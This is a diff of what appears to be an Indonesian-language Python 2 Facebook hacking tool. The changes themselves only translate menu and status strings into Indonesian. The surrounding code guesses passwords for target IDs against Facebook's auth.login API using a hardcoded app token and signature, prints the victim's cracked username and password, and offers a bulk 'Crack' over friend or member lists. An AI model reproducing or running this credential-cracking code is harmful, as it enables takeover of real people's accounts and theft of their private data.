@@ -157,9 +157,9 @@ def menu():
     os.system('clear')
     print logo
     print '\x1b[1;97m\xe2\x95\x94' + 50 * '\xe2\x95\x90' + '╗'
-    print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Name \x1b[1;91m: \x1b[1;92m' + nama + (39 - len(nama)) * '\x1b[1;97m ' + '║'
+    print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Nama \x1b[1;91m: \x1b[1;92m' + nama + (39 - len(nama)) * '\x1b[1;97m ' + '║'
     print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m FBID \x1b[1;91m: \x1b[1;92m' + id + (39 - len(id)) * '\x1b[1;97m ' + '║'
-    print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Subs \x1b[1;91m: \x1b[1;92m' + sub + (39 - len(sub)) * '\x1b[1;97m ' + '║'
+    print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Pengikut \x1b[1;91m: \x1b[1;92m' + sub + (39 - len(sub)) * '\x1b[1;97m ' + '║'
     print '\x1b[1;97m╠' + 50 * '\xe2\x95\x90' + '╝'
     print '║-> \x1b[1;37;40m1. Informasi Akun Teman'
     print '║-> \x1b[1;37;40m2. Retas Akun FB'
@@ -223,8 +223,8 @@ def informasi():
     os.system('clear')
     print logo
     print 52 * '\x1b[1;97m\xe2\x95\x90'
-    id = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukkan ID\x1b[1;97m/\x1b[1;92mName\x1b[1;91m : \x1b[1;97m')
-    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMohon Tunggu \x1b[1;97m...')
+    id = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukkan ID\x1b[1;97m/\x1b[1;92mNama\x1b[1;91m : \x1b[1;97m')
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mLagi Kepoin \x1b[1;97m...')
     r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
     cok = json.loads(r.text)
     for p in cok['data']:
@@ -356,10 +356,10 @@ def mini():
             jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu ye \x1b[1;97m...')
             r = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
             a = json.loads(r.text)
-            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mName\x1b[1;97m : ' + a['name']
-            jalan('\x1b[1;91m[+] \x1b[1;92mChecking \x1b[1;97m...')
+            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama\x1b[1;97m : ' + a['name']
+            jalan('\x1b[1;91m[+] \x1b[1;92mProses \x1b[1;97m...')
             time.sleep(1)
-            jalan('\x1b[1;91m[+] \x1b[1;92mOpen Security \x1b[1;97m...')
+            jalan('\x1b[1;91m[+] \x1b[1;92mOprek Data \x1b[1;97m...')
             time.sleep(1)
             jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu ye \x1b[1;97m...')
             print 52 * '\x1b[1;97m\xe2\x95\x90'
@@ -367,8 +367,8 @@ def mini():
             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
             y = json.load(data)
             if 'access_token' in y:
-                print '\x1b[1;91m[+] \x1b[1;92mKETEMU WOYY AWIKWOK.'
-                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
+                print '\x1b[1;91m[+] \x1b[1;92mKETEMU WOYY AWIKWOK, EZ PZ.'
+                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama FB\x1b[1;97m     : ' + a['name']
                 print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama Pengguna\x1b[1;97m : ' + id
                 print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mKata Sandi\x1b[1;97m : ' + pz1
                 raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
@@ -388,7 +388,7 @@ def mini():
                     y = json.load(data)
                     if 'access_token' in y:
                         print '\x1b[1;91m[+] \x1b[1;92mKETEMU WOYY AWIKWOK.'
-                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
+                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama FB\x1b[1;97m     : ' + a['name']
                         print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama Pengguna\x1b[1;97m : ' + id
                         print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mKata Sandi\x1b[1;97m : ' + pz2
                         raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
@@ -396,7 +396,7 @@ def mini():
                     else:
                         if 'www.facebook.com' in y['error_msg']:
                             print '\x1b[1;91m[+] \x1b[1;92mKETEMU.'
-                            print '\x1b[1;91m[!] \x1b[1;93mTAPI AKUNNYA KENA SESU ATAU CHECKPOINT WKWK'
+                            print '\x1b[1;91m[!] \x1b[1;93mTAPI AKUNNYA KENA SESI ATAU CHECKPOINT WKWK'
                             print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama Pengguna\x1b[1;97m : ' + id
                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mKata Sandi\x1b[1;97m : ' + pz2
@@ -411,7 +411,7 @@ def mini():
                                 print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                                 print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama Pengguna\x1b[1;97m : ' + id
                                 print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mKata Sandi\x1b[1;97m : ' + pz3
-                                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                                 menu_hack()
                             else:
                                 if 'www.facebook.com' in y['error_msg']:
@@ -643,11 +643,11 @@ def pilih_super():
                     else:
                         print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'
                         pilih_super()
-    print '\x1b[1;91m[+] \x1b[1;92mTotal ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
+    print '\x1b[1;91m[+] \x1b[1;92mJumlah Member atau Teman \x1b[1;91m: \x1b[1;97m' + str(len(id))
     jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mSabar Woyy \x1b[1;97m...')
     titik = ['.   ', '..  ', '... ']
     for o in titik:
-        print '\r\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack \x1b[1;97m' + o,
+        print '\r\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mProses Gan \x1b[1;97m' + o,
         sys.stdout.flush()
         time.sleep(0.01)
 
